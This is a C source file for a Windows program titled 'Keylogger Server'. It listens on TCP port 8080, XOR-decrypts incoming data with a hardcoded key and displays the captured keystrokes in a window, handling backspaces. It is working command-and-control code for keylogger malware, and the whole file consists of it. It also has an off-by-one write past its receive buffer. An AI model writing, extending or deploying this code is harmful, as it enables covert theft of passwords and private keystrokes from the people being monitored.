#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib") // Link Winsock library

#define PORT 8080
#define WM_SOCKET (WM_USER + 1)
#define MAX_BUFFER 4096
#define ENCRYPTION_KEY "S3cr3tK3y"

char displayBuffer[MAX_BUFFER] = {0};
HWND mainWindow;
SOCKET server_fd, client_socket;
RECT clientRect;
HFONT hFont;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void InitServer(HWND hwnd);
void decryptData(char *data);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Register window class
    const char CLASS_NAME[] = "Server Window Class";
    
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.style = CS_HREDRAW | CS_VREDRAW;  // Redraw on resize
    
    RegisterClass(&wc);

    // Create window
    mainWindow = CreateWindowEx(
        0,
        CLASS_NAME,
        "Keylogger Server",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        800, 600,
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (mainWindow == NULL) {
        return 0;
    }

    // Create font
    hFont = CreateFont(
        16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        "Consolas"
    );

    ShowWindow(mainWindow, nCmdShow);
    UpdateWindow(mainWindow);
    InitServer(mainWindow);

    // Message loop
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DeleteObject(hFont);
    return 0;
}

void InitServer(HWND hwnd) {
    WSADATA wsa;
    struct sockaddr_in server_addr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        MessageBox(hwnd, "Failed to initialize Winsock", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        MessageBox(hwnd, "Socket creation failed", "Error", MB_OK | MB_ICONERROR);
        WSACleanup();
        return;
    }

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind socket
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        MessageBox(hwnd, "Bind failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return;
    }

    // Listen for connections
    if (listen(server_fd, 3) == SOCKET_ERROR) {
        MessageBox(hwnd, "Listen failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return;
    }

    // Associate socket with window message
    WSAAsyncSelect(server_fd, hwnd, WM_SOCKET, FD_ACCEPT | FD_READ | FD_CLOSE);
}

void decryptData(char *data) {
    int key_len = strlen(ENCRYPTION_KEY);
    int data_len = strlen(data);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_SIZE: {
            GetClientRect(hwnd, &clientRect);
            InvalidateRect(hwnd, NULL, TRUE);
            return 0;
        }

        case WM_SOCKET: {
            if (WSAGETSELECTERROR(lParam)) {
                closesocket((SOCKET)wParam);
                return 0;
            }

            switch (WSAGETSELECTEVENT(lParam)) {
                case FD_ACCEPT: {
                    client_socket = accept(server_fd, NULL, NULL);
                    if (client_socket == INVALID_SOCKET) {
                        MessageBox(hwnd, "Accept failed", "Error", MB_OK | MB_ICONERROR);
                        return 0;
                    }
                    WSAAsyncSelect(client_socket, hwnd, WM_SOCKET, FD_READ | FD_CLOSE);
                    break;
                }
                
                case FD_READ: {
                    char buffer[1024] = {0};
                    int bytes_read = recv(client_socket, buffer, sizeof(buffer), 0);
                    if (bytes_read > 0) {
                        buffer[bytes_read] = '\0';  // Ensure null termination
                        decryptData(buffer);
                        
                        if (buffer[0] == '\b') {
                            int len = strlen(displayBuffer);
                            if (len > 0) {
                                displayBuffer[len - 1] = '\0';
                            }
                        } else {
                            // Prevent buffer overflow
                            if (strlen(displayBuffer) + strlen(buffer) < MAX_BUFFER - 1) {
                                strcat(displayBuffer, buffer);
                            }
                        }
                        InvalidateRect(hwnd, NULL, TRUE);
                    }
                    break;
                }

                case FD_CLOSE: {
                    closesocket(client_socket);
                    break;
                }
            }
            return 0;
        }

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            // Set up double buffering
            HDC hdcMem = CreateCompatibleDC(hdc);
            HBITMAP hbmMem = CreateCompatibleBitmap(hdc, clientRect.right, clientRect.bottom);
            HBITMAP hbmOld = SelectObject(hdcMem, hbmMem);
            
            // Clear background
            HBRUSH hBrush = (HBRUSH)GetStockObject(WHITE_BRUSH);
            FillRect(hdcMem, &clientRect, hBrush);
            
            // Set up text drawing
            SetBkMode(hdcMem, TRANSPARENT);
            HFONT hOldFont = SelectObject(hdcMem, hFont);
            
            // Calculate text rectangle with margins
            RECT textRect = {
                20,                    // Left margin
                20,                    // Top margin
                clientRect.right - 20, // Right margin
                clientRect.bottom - 20 // Bottom margin
            };
            
            // Draw wrapped text
            DrawText(hdcMem, displayBuffer, -1, &textRect, 
                    DT_WORDBREAK | DT_WORD_ELLIPSIS);
            
            // Copy the off-screen bitmap onto the screen
            BitBlt(hdc, 0, 0, clientRect.right, clientRect.bottom, 
                   hdcMem, 0, 0, SRCCOPY);
            
            // Clean up
            SelectObject(hdcMem, hOldFont);
            SelectObject(hdcMem, hbmOld);
            DeleteObject(hbmMem);
            DeleteDC(hdcMem);
            
            EndPaint(hwnd, &ps);
            return 0;
        }

        case WM_DESTROY: {
            closesocket(client_socket);
            closesocket(server_fd);
            WSACleanup();
            PostQuitMessage(0);
            return 0;
        }

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}